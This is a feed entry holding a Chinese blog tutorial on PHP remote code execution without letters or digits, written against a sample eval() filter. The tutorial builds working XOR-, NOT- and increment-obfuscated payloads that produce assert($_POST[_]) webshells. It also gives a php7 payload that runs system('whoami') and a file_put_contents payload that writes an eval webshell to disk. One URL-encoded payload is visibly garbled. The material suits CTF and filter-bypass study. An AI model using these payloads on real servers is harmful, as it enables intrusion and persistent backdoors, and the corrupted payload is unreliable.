    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之无数字字母rce</title>
    <link href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"/>
    <id>https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/</id>
    <published>2021-07-27T16:00:00.000Z</published>
    <updated>2021-08-09T14:14:06.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><p>无数字字母rce，这是一个老生常谈的问题了，就是不利用数字和字母构造出<code>webshell</code>，从而能够执行我们的命令，之前一直没有系统总结过，今天来好好总结总结，这里主要是总结异或和取反两种方法，这两种方法是目前来看最实用的两种方法，还有一种自增的方法稍微介绍一下就好</p><span id="more"></span><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的思路就是利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p><h2 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h2><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong>，<code>ascii码</code>表参考如下：</p><p><img src="https://i.loli.net/2021/07/27/vmfHFZrN9GLSC8j.png" alt="image.png"></p><p>那假如说我们想要构造出小写字母<code>a</code>，按照上表，<code>a</code>的二进制为<code>01100001</code>，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，我选择的是<code>@</code>和<code>!</code>这两个，成功异或出了字母<code>a</code>：</p><p><img src="https://i.loli.net/2021/07/27/9LjN3A1XWbI5gyQ.png" alt="image.png"></p><p>然后我们就可以按照这个方法进行拼接了，我们的目标字符串是<code>assert($_POST[_])</code>，其实很简单，我们需要拼接的字母只有九个而已，拼接结果如下，因为很多都是不可见的字符，所以说我就先url编码了一下（url编码就是它的16进制编码前面加个<code>%</code>哈）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">P:<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; O:<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span> ; S:<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p>以上是我自己构造的，经检验没有问题，构造结果可能会有很多种，但方法都是一样的，这样就可以成功进行rce了，</p><p><img src="https://i.loli.net/2021/07/27/vSh3eydGNwBzgkZ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/27/kypjYmDBNxHvRET.png" alt="image.png"></p><h2 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h2><p>取反也是php中的一种运算符，关于取反的具体规则可以参考这篇文章：<a href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">https://blog.csdn.net/WilliamsWayne/article/details/78259501</a>，写得挺详细的，取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>首先，我们想要构造的依然是<code>assert($_POST[_])</code>这条语句，和上面一样，我们先用<code>php</code>的取反符号<code>~</code>将字符串<code>assert</code>和<code>_POST</code>取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可，具体请见下图：</p><p><img src="https://i.loli.net/2021/07/28/AYS9t7P1phwTdaK.png" alt="image.png"></p><p>可以看到，<code>assert</code>的取反结果是<code>%9E%8C%8C%9A%8D%8B</code>，<code>_POST</code>的取反结果是<code>%A0%AF%B0%AC%AB</code>，那我们就开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);    <span class="comment">//这里利用取反符号把它取回来，$_=assert</span></span><br><span class="line"><span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);      <span class="comment">//$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;                   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);                 <span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);<span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/4NFVPvmRjJueMqs.png" alt="image.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>方法二是我看p神博客才了解到的方法，就是说利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，然后再进行一次取反操作，就能得到一个我们想要的字符，这里的原理我确实是不知道，因为这里好像是涉及到计组知识而我现在还没学，害，现在就只有先学会怎么用，原理后面再补了</p><p><img src="https://i.loli.net/2021/07/28/6lw7a4knZY3B9SH.png" alt="image.png"></p><p>这里之所以会输出两个相同的<code>r</code>，就是因为里面<code>$_&#123;1&#125;</code>就是<code>\x8d</code>，然后这里对<code>\x86</code>进行取反就能得到<code>r</code>，原理不详</p><p>总之我们需要知道的是，对于一个汉字进行<code>~($x&#123;0&#125;)</code>或<code>~($x&#123;1&#125;)</code>或<code>~($x&#123;2&#125;)</code>的操作，可以得到某个<code>ascii码</code>的字符值，我们就可以利用这一点构造出<code>webshell</code></p><p>这里由于不知道原理，我就不自己构造了，直接拿出网上大神的exp:<a href="https://xz.aliyun.com/t/8107">https://xz.aliyun.com/t/8107</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;<span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span> = <span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure><p>由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20&#x27;_&#x27;%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/yormF8QcDX6BJMC.png" alt="image.png"></p><h2 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增 ++"></a>3.自增 ++</h2><p>我们先看看php语言自增、自减的规则：<a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p><p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><p><img src="https://i.loli.net/2021/07/28/4HgcwPoizFrmWxn.png" alt="image.png"></p><p>这里我就直接给出p神的构造结果了，构造出来很长，而且我感觉也不是特别实用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>放到一排再url编码之后是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xspan><br></pre></td></tr></table></figure><p>说实话真的太长了，要是稍微有个长度限制就用不了，所以说这种方法只做了解即可</p><h2 id="php5和php7的区别"><a href="#php5和php7的区别" class="headerlink" title="php5和php7的区别"></a>php5和php7的区别</h2><p>在研究无数字字母rce的过程中，一个很重要的函数就是<code>assert</code>，但在php5的版本和php7的版本中，它是有一些区别的，我们上面的测试都是基于php5进行的，在php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码，在php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，但是在php7中，我们可以使用($a)()这种方法来执行命令，那相当于我们对phpinfo取反后就可以直接执行了，也可以选择file_put_contents()来写入shell，在php5中这样是不行的：</p><p><img src="https://i.loli.net/2021/07/28/Qg5qLsabUhoZMj2.png" alt="image.png"></p><h3 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h3><p>在php7中，因为可以使用($a)()这种方法来执行命令，所以说我们利用<code>call_user_func()</code>来举例，<code>(call_user_func)(system,whoami,&#39;&#39;)</code>即可执行<code>whoami</code>的命令：</p><p><img src="https://i.loli.net/2021/07/28/MJiaehA9p1HUrKD.png" alt="image.png"></p><p>那构造出来的结果就为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);</span><br></pre></td></tr></table></figure><h3 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h3><p>再来一个在php7中利用<code>file_put_contents()</code>写入<code>shell</code>的例子：</p><p><img src="https://i.loli.net/2021/07/28/ZLgrdRDoOp1Kjsv.png" alt="image.png"></p><p>我们要构造的语句为：<code>file_put_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code>构造出来就为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));</span><br></pre></td></tr></table></figure><p>这里要注意的就是要有该目录的写入权限哈</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/8107">https://xz.aliyun.com/t/8107</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/112898103?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_46330722/article/details/112898103?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
